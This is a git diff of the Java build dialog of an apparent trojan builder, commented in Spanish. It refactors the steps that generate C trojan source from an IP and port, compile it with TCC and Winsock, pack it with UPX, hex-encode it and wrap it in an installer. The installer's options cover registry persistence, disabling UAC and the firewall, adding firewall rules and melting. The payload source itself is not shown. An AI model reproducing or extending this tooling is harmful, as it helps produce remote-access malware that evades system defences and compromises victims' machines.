@@ -113,17 +113,18 @@ public class Build extends JDialog {
 			        // PRIMER PASO: CREAR EL PAYLOAD
 			        File choosed = new File(output.getText());  // Hacemos un nuevo archivo con la ruta especificada
 			        String choosedPath = choosed.getAbsolutePath();     // Sacamos la ruta en un String
-			        Pattern raw_slatch_pattern = Pattern.compile(Pattern.quote(System.getProperty("file.separator")));  // Hacemos un nuevo patrón para separar Strings con el separador del sistema operativo: \ en Windows y / en Linux y MAC OS X
+			        Pattern raw_slatch_pattern = Pattern.compile(Pattern.quote(File.separator));  // Hacemos un nuevo patrón para separar Strings con el separador del sistema operativo: \ en Windows y / en Linux y MAC OS X
 			        String[] slatches = raw_slatch_pattern.split(choosedPath);      // Separamos la variable con la ruta en un array de Strings
 
 			        String choosedFolderPath = "";      // Variable para almacenar la carpeta donde se creará el payload
 			        for(int i=0;i<slatches.length-1;i++){   // Por cada separador... (menos el último)
-			            choosedFolderPath = choosedFolderPath + slatches[i] + System.getProperty("file.separator"); // Añadimos a choosedFolderPath, el separador actual y el separador del sistema
+			            choosedFolderPath = choosedFolderPath + slatches[i] + File.separator; // Añadimos a choosedFolderPath, el separador actual y el separador del sistema
 			        }
 			        
 			        File trojan = new File(choosedFolderPath + "temp.c");   // En la carpeta de antes, abrimos (creamos) el archivo "temp.c"
 			        
-			        GenerateTrojan generateTrojan = new GenerateTrojan(trojan, IP, PORT);   // Llamamos a GenerateTrojan con el archivo "temp.c", la IP y el puerto como argumentos
+			        
+			        GenerateTrojan.generate(trojan, IP, PORT);   // Llamamos a GenerateTrojan con el archivo "temp.c", la IP y el puerto como argumentos
 			        
 			        COMPILAR(trojan.getAbsolutePath()); // Compilamos el código generado
 			        if(!debug) trojan.delete();            // Eliminamos el archivo "temp.c"
@@ -134,17 +135,14 @@ public class Build extends JDialog {
 			            UPX(tempEXE.getAbsolutePath());     // Pasar ejecutable temporal por UPX
 			        }
 			        
-			        // SEGUNDO PASO: CONVERTIR ARCHIVO COMPILADO A HEXADECIMAL
-			        GenerateHexTrojan generateHexTrojan = new GenerateHexTrojan();      // Creamos una nueva instancia de GenerateHexTrojan
-			        String HEXEDFILE = generateHexTrojan.GenerateHexTrojan(tempEXE);    // Almacenamos en un String la llamada a GenerateHexTrojan con el ejecutable temporal como argumento
+			        // SEGUNDO PASO: CONVERTIR ARCHIVO COMPILADO A HEXADECIMAL			        
+			        String HEXEDFILE = GenerateHexTrojan.generate(tempEXE);    // Almacenamos en un String la llamada a GenerateHexTrojan con el ejecutable temporal como argumento
 			        
 			        if(!debug) tempEXE.delete();           // Eliminamos el archivo "temp.exe"
 			        
 			        // TERCER PASO: CREAR EL INSTALADOR
-			        GenerateInstaller generateInstaller = new GenerateInstaller();      // Creamos una nueva instancia de GenerateInstaller
-			        generateInstaller.GenerateInstaller(choosed, PATH, FILENAME, ADFOLDER, HKCU, HKLM, DISABLEUAC, DISABLEFIREWALL, ADDFIREWALL, PORT, MELT, HEXEDFILE);    // Llamamos a GenerateInstaller
+			        String CFILE = GenerateInstaller.generate(choosed, PATH, FILENAME, ADFOLDER, HKCU, HKLM, DISABLEUAC, DISABLEFIREWALL, ADDFIREWALL, PORT, MELT, HEXEDFILE);    // Guardamos en un String la ruta del código fuente del instalador
 
-			        String CFILE = generateInstaller.GetCFILE();        // Guardamos en un String la ruta del código fuente del instalador
 			        COMPILAR(CFILE);        // Lo compilamos
 			        File FileCFILE = new File(CFILE);       // Lo abrimos en un archivo
 
@@ -167,10 +165,10 @@ public class Build extends JDialog {
 	
 	
 	private void COMPILAR(String file){     // FUNCIÓN PARA COMPILAR CÓDIGO C
-        String tcc = "tcc/tcc.exe";     // Creamos un String donde se almacenará la línea de comandos a ejecutar, con el ejecutable de TCC,
-        tcc = tcc + " \""+file+"\"";    // el archivo recibido como parámetro (importante: entre comillas, porque puede fallar si tiene espacios),
-        tcc = tcc + " ws2_32.def";      // añadimos el archivo "ws2_32.def" al compilador,
-        tcc = tcc + " -luser32";        // añadimos la librería "user32",
+        String tcc = "tcc/tcc.exe";     // Creamos un String donde se almacenará la línea de comandos a ejecutar, con el ejecutable de TCC
+        tcc = tcc + " \""+file+"\"";    // el archivo recibido como parámetro (importante: entre comillas, porque puede fallar si tiene espacios)
+        tcc = tcc + " ws2_32.def";      // añadimos el archivo "ws2_32.def" al compilador
+        tcc = tcc + " -luser32";        // añadimos la librería "user32"
         tcc = tcc + " -lkernel32";      // añadimos la librería "kernel32"
 
         if(System.getProperty("os.name").equals("Linux") | System.getProperty("os.name").equalsIgnoreCase("MAC OS X")){     // Si el sistema operativo es Linux o MAC OS X
